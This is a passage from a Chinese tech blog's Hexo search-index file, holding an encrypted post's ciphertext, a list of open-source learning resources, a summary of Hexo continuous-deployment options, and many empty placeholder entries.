16c14b5290790b3b8a6252b9a4a86ca4ebec97dea698a416b46130ac27fa4e4068238ecd59cf60f06d18918c543e58317e81a3a26b7e7fba35efa6af3d031c1ad9ab6e7bd31315e51bdce394d0b9cb4624f0ee805ffdd49defcbce106755fab6c69db54beb26d326a83c71f79ff4c78fc284d93a64256d7aea031205168f5915df57faa244815a2d17288cdf1c0903d26f2b73d6f2190a7359037f266211b7c2e73eb56bf24741badc38d42f7fac73036ab9439de0e568b7f79db577489824348bf7987efcea9f84dd68f8217968f16b6ec824c0450410555c962cc4316791276ba5d79e42ad88c58259178fc5ca59c39cdf5b7430a6d23bd124dcffe00de7e7a789b296cc6de147030240e4aa48267cee7387243a699fc0dfa42175c46217eb66edd2c75caa7e36216e4467f593e9f65ccddd06224b584cfb6b0718d48b77ddc1b1bbb3380b8b8891ea93279d1270029ee1ef240a00e0ccdca7399d47af36534a2765243260661bfad469436b14538de3eaa333fb46eb5b826eab149bd76e04c2ffa8678ed2844f7e4b69ce014ad0ffa251ee16195c3ee0046e2fa725a97085cff745ff90f369362fccf0eb2c03253fde30f988040a8ce4cc5539fd188da81e30c6e62e7baaa886d8db3afe71ff1d9d6d462a21126da61037d676a8979ac8ea82bc0a78e148b5b75b7cd8f5e09a2fd645c0a6cbc5040127fdd53c6054c0a8ed083931f6bdfcab06ad302157b7616b8cd3cd4664ae3678e3c8e450ea6cf79388bde190df8a655606cf7f5c021a81e0db3a570dadbeffeb9951a917f6a0d7542b60a106a52dc809e6f8fce0e02f7d582fa886f7e90e7ba05f7f33c0deb07474d6af47fd0cf9b2b371fabf3649d75db9b0357074518c9f7025e9eac5b59396c012295577a4641e3eaa27e99981a83f0fb060c4334680f44e880ecbb33f35d3de3eca8ea73fa864003932e3365b576e861f14e0460ada3e1800a4653a426ab6f958822150c42dbf884f30a0eb8a92fd4fce6ec39880727954a037200f18e3db5c674e3498d94b1ee7fe60c5d9973e46935589b7b9f41cfcd394c1109df107fa7e8fc5c3c41778d2d9775dbcc78d3b18cddad0e9efb46ef2d3f6369e9bb02fe0942a80fef8fc79a1fff2ac66df3760296079752659b9f257f2caa5616b3e4b9d5b961b72b061db39fc9dfcbdd7b7f73c64125816c2cd58a0cdc6cecdf0d065c2e352c15afee2fa0aa6a8f60c5b69ac5c9d6cc3b5047a3f07100b5a6f55abd639fc161e6216cda5f6b270a76a3771ed528e252a67ca1446876d0f66fec91b9dd2cb43b3edb4e5977b8dcc0b93134a1b0ac84fdc0bcfb8e756638bf9e8c197fb3305f5c946df4d69aab130fc84a67b175f8fc56727dc832a1f8d4f8835aea308afc874ecfb91f7ec809243cc723c8da9deb53264f313a6507335ea464f4fac4bbc6ba1dd8baa3592dd3b4cb7048c982908270bb1e56ff8a2236435a4521335d6e8e25220d1ade80bb1324da37f5bc8342cc8c3f2f1dec49bd9ca1f25c708c75b80d97a77209068f7cb38d0e9b2760ce20f740f4dd72b7d5f7040cdd27414f6fa0c5c9bd11115f019eca8a7a3a2ad4683d63a4adc7ede0dded67f51f56b3c5815d32947a010d166d4a3f3b8992319543d6abdf1febabd4f5c21efe67daa9aeaa780c1c69a68e64d6107dc04c4b228bae21c07234796deeced11901d26af42d018577cb22714f4c0bfe5fe2e3e090bd6a826c8532d2a19c04c657727bd8d711f872b1b62970b34392121c442eb0e619318be84eed18e92a0c38f2da138e51097d11d68618ccb2def1e5cfee208f7e499c868cf29a62499b83809ccea80ccadb4ecb15cee418c019153efc112a257f81c4b040620b8fd29e7aa02696a4abaf9cecbdcb92945aae845771db340179f06ae8ee79ee583f94c3876d61599da417a3cdac88f74ca19925a1550cf6413cc85e0738f79bdfa7e47cbb1f742997cb6be18997d81be56bd25ba6d0d480bb58dfc0f036043b42621d0422049c59f34d4fdb829c7949e36a1cf82d11208e7356d76d4a74c621eb21d2218d03a16ab5a006054c8acf510bb3dbd9144516a8308aa5a7505062a3ede252185098fe06c9832c6f450b501c4117ec8dd04a48e57ef64e742f7cad9c9331bb07cf7c351fb53085656aa2274f0383082d42036111291db40bb7d36c9feb93d9305e48749db47fffcedc9a1916157534fd5408391da4ad9930914f73e42f3658daee4dbf2aed2679ca98f27c970a0b9e7a5134c25ffb8f649c311742f78019695d328f5034fcc21df8d52b2345a8c5bdd416011b8513caf80b546d70a45b05e88bbad47e85af9d02b62eaab15d126cc4d6235f4f8401d899218eb3becf30e057a095714d979c02203a3ea6f7d2917842d5bef8e3286691bfa8263d459ec892af9063f7a0d92258a53497a97e120ecc9c098acfec5cdc6e6285839b16bb2ced3a41c46f47e2ebeab43d7731754b881394d8dbdc7dec787077a75f9aeff26c511d8330e6bc34584bf64b701906c9fb63ecfcdfc1a39d6eb57bc41092d04abd71c450fc6775ce5ba921cc553bfd0df7402553b1170c207eb1f495e1390e5445ca96c57a072cd5828b386293f9e0cfc8fbe79c9716e0e514277a4129d7e87d081fdb90283702f5affdf25aaf73845d36c5a18424ae575589893351e76b3aa4b13a527d407405dd530a9e60bcacae40a7f25f56f53c8320692134055427f013ddeb0e699c7c672f0b77bceda8d62043c7c35dcb1458675270fe9b153cd24417e46ce9d38e8a1acc71483ae51d2e5079b749953cac4f29f010f226bc6e0818700fe650b16be9e2057a61f0581efc7163cb679b2fbdf437097ab89d6bab2f6d8b544674fe6c279c02dff6f18654532caf2a84a3b09a75a7f66f0f7e3a37db6afe80b87f6b9813295fb80736e8239d2a257e997d1ecafa66da3eff06d82dac9b87d83dea83bb3b337d2cce4449bbe5f3c8fbca13aa32aa66b9e8e9b65b09e8372f922b968b1d1ac935cfd8dbb834fbc43e28a426900123f398f73a54ef2e7b3fa132fe3111f18372c5e8651ebecc16d12bf91eca798050438873e21e9476ddab8c044f6ce85bf7d5bbdffb928bdff5c2c6dbf6601924cf6e8f48e08f1ef36dd2b8eaa93ce53ac8b0dc08207a9667e627b13560a0085a1abea6102e44de24374a8cccd91b4c0822d4d954078f055bb1066d0ee79787406ffb6d0627bdcfedbad6b6840d5019251c0139f5f8c5f80a977444725d3cdc2714d5fcbf2177a783fbe0b4066b1004b26a10eb52233851c0c8138982ffddc0644cfb9c7468fa295087510c4f3cfd0fb1e614d534a3980b23b2d8825caa861c6cb59ec83a5e763b76209ae14b72841661d796aabb58eb5f357c816e3275304e75816cada4b5a2d46ec2c586cdc193723b8c90717b71f0d46b8ac6f50ea8194ad6aaac20a13262a36272323d00d9bb40601c5ed72cfd8a7d8f1cfa7344ded2214b843d68bffc51ae63c63ce3dfb3a3d4e75457ffc9721d47ea3f8284db9dbe0725e4a257439ffd168c4a66473393d2e437d63305456c9dd8f66634438457ce944dd0ff793c87dbd72fb893963e579990ec2d8671e71dc650eff8ca2b2477068af99aea3b54dd761b0bbe39bb6d1c9b331f8d06d7f9b7a1d4b95f6d8bc101d51f47ce491d5a25975ce2dfba28a232aa3a6f69857237e432bc976169acdcd333698e039c95f183b037bae7da7bde5f8c7ea8f995f2a9cb9df52d50bb822653e5a1efda9a5c2ff0c8677667ac28b3fc1e0f349464a6a6ae656933aad136cd355bacab7e0c778f8dce59b03d440d10dff7677b46ee5cb5d1f057834ebeb55f6773809a904e9a2f447ac3e8ac1f283d7f754e5107f9048b8906cd681f372341a62a30420a3a5e2a29045f4dde1639b7aabd9812db112b60e5460cbdf60f0fb5fb23b36baf83cda18252b6e44745d3c178586e9242ad690a101557d31d577a5be7b4b44a915b162ecec9d238c8886b2d2ccf4a347607a6b3095e89df2ed4d132624487557e7656ac48e80512bf96fb7a1b5bd821dce9c904e76ad138b5f1ed9366db791d4bfa591fe3fda75313db5b9791ede6c369716ce792ec9b4d560de8a2868ee033586a1de6beb14386cca7e14dca5bbb37e245a732078b7c574a9081ac2142cf028836ed21b5b1a7b3f9bd9a4073627e4a5fa6098f16b5653cc2593c4225274591dd36e10f27c1c7b7ac699b1bc2a94731e1e6b6a2a3785b8e52610ef0d0dd6961da92e57e58e52153c6e44570e77019d84263784715999ef2b1ede46fa9c8d8319f5b07e5b7464711b35c548d8204d8aad9eb682dbb54fe0ae29bd2082f75ed2fcc5de4475252284354189ff971373c02db70ecaa5d99f2dabea777f41aff811af0a1ad4f29fd228ed29f56089ca1ae4e8e97b2e226e3f3d915700f0b83e025420a59b6101caafe17a0cfa87b06d661e4e4b90aebb7ab4495ed3bcfd8379b09bca8c8a81d96783cd0b202c8679591a4f56e70f0de81f3a003e9f06be64dd33f0511ffa8eb04d72b3d1f732eb05ecd946ce2fd6277dd22938058984df75ce57ae4ccf6474c3c84e9a37377abe7980af6a39cb21dcf9bd39b0a88c5a510a27f9711efe6617fffb1c71fc0c63e45e48fd84c75b7b2ecd0a72e83e0065f6e827905d1c8c1072feaa8a54299f1f2dfc4994d0ce272e22709b7bc6bb0b2f82118897c17c172b08e9f438738395415587668efffed5051bf9cf98d33e1cd7a4c7ea39104639fd46a33483ccc9fb2dead8797b0607f1aede3699d5d8bf9460708011a610bf4f8179fb11224d1ce6dbebe599c489995227d7a600d1f2f9e91d10b3259643364f1f01224c489b76dda3220d636716c025ec1d77883a2b39987113b8e28f4463993fb72407b2c7fd5ac51532baa2ea063ab5b4389ad39c754829f38017b4f93934a2bd26a20125a23267922ab451923860fb973b59464b6df8838358575837af08bcd0ce043b6aa26b3ee072f72cf894a14158fd570fc6b088f7b63f266420b261aa9d7fae5f11e47075e9c8284164488e4872ae6decad5d7b707ea0044e124a43d9c7278ca39fd19f4d2d7babf03ff2b0f6a44d3e8c290abaf9ad3d75a2a47b7a999e97732b1d5bce2f5270aa3efb45d5f24db9fd72fa41899f32ab32f370d1c69e49d34f149b8780babd47a8f37fa08535af424e3dcd8da724a918e1f7bc466687d8fefe7488e238e4dd59d6bb13dac19dbd02f29bb61c4b906b1ccd64cf1a5015e2426b0cfead23dc71ef198d315572681ea7b276671f230d50d71545312c62e94ce9487904bea3cf6407d549f0367761b35f8f825c891c6fcdb88e20ae512983817b72040d7c8c3d47a84444e1f67b10bb23b86c8ebbf7464ac8b7c21858bbb9897e2af2edbc2d5018278ec0782b2c0edc0cb10f95325816e22f424fbf6debdd8a31fa89146201965f3f59254e6e285c416e90c3851383ba9970aebd765912272d96937200f3511cef90f8f02a2abfe9963386355da6f784d759427f312173969262fc6ac7f9e100ce019e62c921d4d693ec83acb1988e2daebf07349c88d828d0a5077082fe5e77e792994b72c6aaf0038267b71ff7237946ea5bbdd27d90c2c0e30648ef52e9a23d84a56b9abae9a062c2d0261973c5130956fd0e289b3044e8f08c8db435b694a6b556636230c38d9120697d7447d79a007dd98868c7e68212504b1b7a5b4ee7b5a967170d9a20a1b5aa48749151859627aefd551c3f6d7bb4d5d63cabd0a75a1f6a8ff7d900dccdb00e7f7e3facfa19e9d3156c8497b3fd7be69ceb5fbb8f88ecf9e83c7697580ba670df5a3ce4514e7cfafef4bf8f2838b5e8c836cc6260027205a43581723a1ae554f7c1635acf6c7d18696be7c91b871b8395f83f1128f53eec63163684c1f8eb077f522e76cb8d7b724a60e51e99a7904a04595a1fa3b083f091d6437ab6d21ace748d4ecd63999792d6a4abd6914473e3dbaf9f0b7ac26b3f7c86b5dc6c335bf0142fcc64d2edbe7e04c157e95bac383ec3235feaf3acfbeedeed50a9f4ff69f94294734457731bc3d0641e857768274e8aaabbc0e4923f55f2083fcc1c139d2cd02756f776c557f6879e8cab400a1e24289b3936347c434fcffdc71400eccea726a66c2c1c47ba7dfc580188cc0573a1bbad1553f0fd1b0b03f3c56e73cb9c3d5b58fd3707c24f926ffc577b423053a62a745add74d1a116118e9b8d179da8b6c1e3e40012838d136c4aac5efaaeaadc127c4f4385efdb0a214728b5cacd5bc9c1e090a37d3f8a468709fbbf2db60e17921aec65616e794214884a7535251f19dfd5f95d53a6e07ad6ff0c92e6c1839b8d4abfda436c8ec609f37d960fde24d2743c9a1440eed87c1d8dc94f00f9a47284aedce6044ff5fc889061fdd10fe6a59220dd7a5c4c401d52e72a65ae68cf2b952a246733b328e56067edfcc41d60aa2058ec9b7175011f89efe20e4a5f50e163b77181f2031f499e543da340601f33f96abbb56183b52ce7350b67d6f33fbab21a99fdf3af1c8cf26b0aad7e5d5b4e2f35c09585d99af8b6daa96fc5bd78b7ca83cbd0d3211b3baf3980a31acda798ead4e63a473e4823480432374d898aa46207f8bc9028a0c23404f6d7958fdcd5089d79eb6979ede547fb2b474bbb87646c4b6c1e2c5dcd6973db13e3859584a859b13fd5287af0b7df520f9b1f99bbd321ecc6726754cd7ec32c0403b7ac040f6051ace534e39eac71c3218f6e82eb049a056517955c3fdefbae9f26da21eeb2bf0d 请 输 入 阅 读 密 码.",tags:"加密博客 开源"},{title:"开源学习资料推荐",url:"/posts/7733a21f.html",text:'学习资料算法 图解 LeetCode 算法 Labuladong 的算法小抄 各种编程语言的算法实现 algorithm-base - 算法基础 多种编程语言实现 LeetCode、《剑指 Offer（第 2 版）》、《程序员面试金典（第 6 版）》题解 Java Java 工程师成神之路 成为一个更好的 Java 程序员 互联网公司常用 Java 框架源码赏析 互联网 Java 工程师进阶知识完全扫盲 Spring Spring Cloud 学习资源 Spring Boot 专栏 - 涵盖 Spring Boot 2.X、Spring Cloud、Spring Cloud Alibaba、Dubbo、分布式消息队列、分布式事务等内容 GitHub GitHub 漫游指南 软件安全 SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 Kubernetes Kubernetes 中文指南 / 云原生应用架构实践手册 面试资料 Java 学习 + 面试指南 一款面试刷题的 Spring Cloud 开源系统 最新 10000+ 道，280 多份 Java 面试题汇总 电子书资料 最新 1000 多本计算机电子书免费下载 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开源"},{title:"Hexo 持续部署方案",url:"/posts/532be336.html",text:'方案一 Hexo 官方推荐的部署方案，是在先本地编写 MarkDown 源文件，然后在本地构建静态资源文件，最后同步静态资源文件到服务器。 方案二 理想的发布模式，使用本地的 MarkDown 编辑器 + 本地的 Git 客户端 + 远程 Git 服务器的 Githooks / Webhooks 功能来实现在本地编写和实时构建发布博客，同时借助远程 Git 服务器（Gitolite、Github、Gitlab）实现了博客源文件的备份。 方案三 借鉴方案二，本地使用的 MarkDown 编辑器 + Git 编写博客，线上则通过 Hexo-Admin 插件实现在 Web 浏览器上编写博客；并且两者都结合了远程 Git 服务端的 Githooks，支持实时构建和发布博客。为了加速国内外访问网站的速度，加入了多线部署的方式，其中包括额外部署到 Coding Pages 和 Github Pages。同时将博客自动构建 / 部署服务与博客提供对外访问的 Web 服务（Nginx）分别部署在两台 Linux 服务器上，Linux 服务器之间则通过 Rsync 同步 Web 静态资源文件，使 Hexo 持续部署方案的性能、可维护性与可用性更高。目前本站的 Hexo 持续部署方案采用方案三，自建站以来一直稳定运行中。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ci/cd 静态博客"},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""}]};